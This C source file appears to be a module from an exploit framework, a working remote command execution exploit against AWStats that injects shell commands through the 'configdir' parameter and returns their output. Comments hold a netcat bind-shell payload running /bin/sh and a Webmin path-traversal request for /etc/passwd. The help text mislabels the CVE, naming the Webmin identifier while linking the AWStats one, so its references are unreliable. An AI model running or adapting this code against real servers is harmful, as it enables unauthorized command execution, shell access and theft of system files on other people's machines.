#include <stdio.h>
#include <stdlib.h>
#include "../exploits.h"
#include "../http-client.h"

// manual disclosure
// curl "192.168.56.102:10000/unauthenticated"`perl -e 'print "/..%01"x40'``echo %2Fetc%2Fpasswd`

struct details execAwstatsDetails = {
    REMOTE
};

struct exploitParam execAwstatsOpts[MAX_NUM_OF_PARAMS] = {
    { "RHOST", REQUIRED, STRING, NOT_SET, NULL, NOT_SET },
    { "RPORT", REQUIRED, STRING, NOT_SET, "80", 2 },
    { "URI", REQUIRED, STRING, NOT_SET, "/awstats/awstats.pl", 19 },
    { "VHOST", NOT_REQUIRED, STRING, NOT_SET, NULL, NOT_SET }
};

static int check(struct Xploit *xp)
{
    // TODO: check Webmin/Usermin version
    return 0;
}

void execAwstatsHelp()
{
    printf("%s[ CVE-2006-3392 ]%s AWStats configdir remote command execution\n", txtblu, txtrst);
    printf("Affected software: Awstats ver. <= 6.2\n");
    printf("References:\n");
    printf("https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-0116\n");
    printf("http://www.securityfocus.com/bid/12298/info\n");
}

int execAwstatsFunc(struct Xploit *xp, unsigned char *rawPayload, unsigned int rawPayloadLen)
{
    char uri[1024] = {0};
    char host[1024];
    char *rhost = xp->currentExploit->params[0].strValue;
    char *rport = xp->currentExploit->params[1].strValue;
    char *uri1 = xp->currentExploit->params[2].strValue;
    HTTP_RESPONSE_CODE httpCode;
    char *resp = NULL;

    //char *rawp = "cat /etc/hosts";
    //char *rawp = "mknod /tmp/ojvwa p; (nc -l -p 4444 |nc -l 4444)0</tmp/ojvwa | /bin/sh >/tmp/ojvwa 2>&1;";
    char *payloadEnc = NULL;
    char * pattern = "%s?configdir=|echo;%s;echo|";

    if(debugMode())
        debugMsg("payloaddd: %s", rawPayload);

    httpUriEncode(rawPayload, &payloadEnc);

    sprintf(uri, pattern, uri1, payloadEnc);
    if(debugMode())
        debugMsg("uri: %s", uri);
    httpCode = httpGETRequest(rhost, atoi(rport), uri, &resp, NULL);

    if(httpCode == HTTP200) 
        printMsg(LOG_INFO, "server returned SUCCESS");
    else 
        printMsg(LOG_WARN, "server may not be vulnerable");

    if(debugMode())
        debugMsg("Command output from the server:\n %s", resp);

    //free(rpathEnc);
    free(resp);
    free(payloadEnc);
    return 0;
}

struct exploit execAwstats = {
    3,
    "exec-awstats",
    execAwstatsFunc,
    execAwstatsOpts,
    4,
    execAwstatsHelp, 
    &execAwstatsDetails
};
